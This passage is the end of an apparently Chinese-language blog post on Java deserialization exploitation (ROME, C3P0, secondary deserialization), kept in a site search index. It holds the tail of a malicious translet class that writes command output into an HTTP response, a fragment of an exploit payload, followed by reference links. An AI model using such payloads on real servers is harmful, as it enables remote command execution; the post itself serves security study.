            <span class="token class-name">Scanner</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> output <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p>非常感谢下面博主的文章，在我学习的过程中给了的很大的帮助：</p>
<p><a href="https://space.bilibili.com/2142877265?plat_id=1&share_from=space&share_medium=android&share_plat=android&share_session_id=4d3b40e0-13ef-43de-91cf-6106a4843d8c&share_source=QQ&share_tag=s_i&timestamp=1695546071&unique_k=larqRBz">白日梦组长的个人空间-白日梦组长个人主页-哔哩哔哩视频</a></p>
<p><a href="https://github.com/Drun1baby/JavaSecurityLearning">Drun1baby&#x2F;JavaSecurityLearning: 记录一下 Java 安全学习历程，也算是半条学习路线了</a></p>
<p><a href="https://tttang.com/archive/1411/">JAVA反序列化之C3P0 - 跳跳糖</a></p>
<p><a href="https://web.archive.org/web/20220820003028/https://tttang.com/archive/1701/#comment-12308">二次反序列化 看我一命通关 - 跳跳糖</a></p>
<p><a href="https://xz.aliyun.com/t/13900?time__1311=GqmxnD2D97itqGNDQieBK0QRI1777YYa4D#toc-1">浅谈Java二次反序列化 - 先知社区</a></p>
<p><a href="http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/index.html">java二次反序列化初探 | Bmth’s blog</a></p>
<p><a href="https://xz.aliyun.com/t/13104?u_atoken=d228f0b4c4ab660552ca5e554adffa63&u_asig=ac11000117309833812541450e003b">ROME反序列化利用链 - 先知社区</a></p>
<p><a href="https://xz.aliyun.com/t/12768?time__1311=GqGxu7G=oYqCqGN4eewuiDgQQjjdOY+bD">Java反序列化之ROME反序列化 - 先知社区</a></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/a9e2a157dbe2da9e08fc7ddff4b8aff2360792159.gif"></p>
]]></content>
      <categories>
        <category>知识总结</category>
      </categories>
      <tags>
        <tag>Java反序列化</tag>
      </tags>
  </entry>
</search>
